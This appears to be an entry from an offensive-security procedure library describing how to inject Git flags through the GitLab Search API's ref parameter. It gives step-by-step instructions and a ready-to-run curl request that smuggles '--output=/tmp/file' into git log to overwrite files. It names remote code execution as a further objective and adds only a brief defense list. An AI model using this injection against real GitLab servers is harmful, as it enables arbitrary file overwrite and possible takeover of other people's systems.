---
tags:
  - command-injection
  - gitlab
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/git]]'
  - '[[tools/ssh]]'
  - '[[tools/cat]]'
  - '[[tools/GitLab-Wiki]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-gitlab-search-wiki-blobs]]'
  - '[[commands/cat-file-contents]]'
  - '[[commands/ssh-gitlab-access]]'
  - '[[commands/id-user-check]]'
  - '[[commands/cat-authorized-keys]]'
  - '[[commands/curl-gitlab-search-blobs]]'
platforms:
  - Linux
  - GitLab
techniques:
  - '[[Command-Line Interface]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 37ef7079-31ef-47aa-9f03-b8d097504059
created_at: '2025-12-11T06:10:29.975Z'
updated_at: '2025-12-11T06:10:29.975Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0002]]'
mitre_techniques:
  - '[[T1059]]'
---
# Inject Git Flag via Search API

## Summary

This procedure exploits the GitLab Search API by injecting unsanitized Git flags into the ref parameter, causing arbitrary Git commands to execute and overwrite files with git log output.

## Description

The ref parameter in the /api/v4/projects/{id}/search endpoint with scope=wiki_blobs is passed directly to git log commands without sanitization, allowing flags like --output= to redirect output to arbitrary files, including controlled commit messages.

## Requirements

1. API token for authentication
2. Project ID with wiki content
3. Network access to GitLab API

## Defense

Defensive measures and detection strategies:

- Implement parameter sanitization in API handlers
- Audit logs for Git command executions with unusual flags

## Objectives

1. Inject Git flags to control command behavior
2. Overwrite target files with controlled content
3. Enable further exploitation like RCE

## Instructions

### Step 1: Prepare API Call

**Context**: Construct the curl command with injected ref.

Set up the URL with scope=wiki_blobs, search=page, and ref=--output=/tmp/file.

### Step 2: Execute Injection

**Context**: Send the request to trigger the vulnerable Git command.

**Command** ([[commands/curl-gitlab-search-wiki-blobs]]):
```bash
curl --header "PRIVATE-TOKEN: $TOKEN" 'http://gitlab-vm.local/api/v4/projects/5/search?scope=wiki_blobs&search=page&ref=--output=/tmp/file'
```

> This injects --output into git log, writing the commit message to /tmp/file.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Command-Line Interface]]

### Sub-Techniques



## Commands Used

- [[commands/curl-gitlab-search-wiki-blobs]]

## Tools Used

- [[tools/curl]]

## Tags

- [[command-injection]]
- [[tools/GitLab-Wiki]]
